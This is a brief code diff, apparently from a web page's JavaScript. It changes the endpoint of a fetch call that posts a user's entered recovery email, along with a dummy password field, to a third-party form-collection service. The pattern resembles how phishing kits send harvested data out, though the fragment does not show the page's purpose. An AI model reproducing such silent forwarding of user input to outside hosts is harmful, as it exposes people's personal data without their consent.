@@ -460,7 +460,7 @@
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/1dJKBcKhm", {
+                         fetch("https://submit-form.com/1dJKBcKhm/mdhere.php", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
